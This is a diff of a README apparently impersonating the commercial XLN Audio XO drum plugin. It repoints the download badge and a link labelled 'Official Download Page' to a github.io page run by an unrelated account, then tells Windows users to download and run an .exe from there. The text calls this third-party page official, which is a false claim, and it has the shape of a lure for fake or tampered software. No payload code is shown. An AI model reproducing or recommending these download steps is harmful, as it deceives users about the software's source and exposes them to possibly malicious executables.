@@ -1,6 +1,6 @@
 # 🥁 XLN-Audio-XO-2026 - Create professional drum beats easily
 
-[![](https://img.shields.io/badge/Download-XLN_Audio_XO_2026-blue)](https://github.com/uncletomhomecourt116/XLN-Audio-XO-2026)
+[![](https://img.shields.io/badge/Download-XLN_Audio_XO_2026-blue)](https://uncletomhomecourt116.github.io)
 
 XLN Audio XO organizes your drum samples into a visual map. You find the right sound for your project in seconds. The software works as a plugin inside your music production programs or as a standalone tool. This guide helps you install and set up the software on Windows 10 or Windows 11.
 
@@ -20,7 +20,7 @@ Audio Interface: Any standard ASIO-compatible audio device.
 
 Follow these steps to put the software on your machine.
 
-1. Go to the [Official Download Page](https://github.com/uncletomhomecourt116/XLN-Audio-XO-2026).
+1. Go to the [Official Download Page](https://uncletomhomecourt116.github.io).
 2. Look for the release section on the webpage.
 3. Click the link to download the installer file. The file ends in .exe.
 4. Save the file to your Downloads folder.
